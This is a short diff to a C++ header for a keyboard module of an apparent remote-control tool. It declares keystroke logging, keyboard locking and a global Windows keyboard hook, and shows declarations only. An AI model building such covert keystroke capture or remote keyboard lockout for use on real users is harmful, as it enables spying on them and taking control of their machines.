@@ -3,7 +3,9 @@
 
 #include <Windows.h>
 #include <iostream>
+#include <map>
 #include <sstream>
+#include <vector>
 
 #include "RCDOMod.h"
 #include "utils.h"
@@ -15,9 +17,10 @@ void logKeystroke(int);
 void lockKeyboard();
 void releaseKeyboard();
 
-extern HHOOK ghHook; // global handle to the hook
+extern std::map<int, std::wstring> mapSpecialKeys;
+extern HHOOK ghHook;
 extern KBDLLHOOKSTRUCT kbdStruct;
-extern const wchar_t *KB_ENV;
+extern std::pair<bool, bool> caseStatus;
 
 class KeyboardMod: public RCDOMod {
     public:
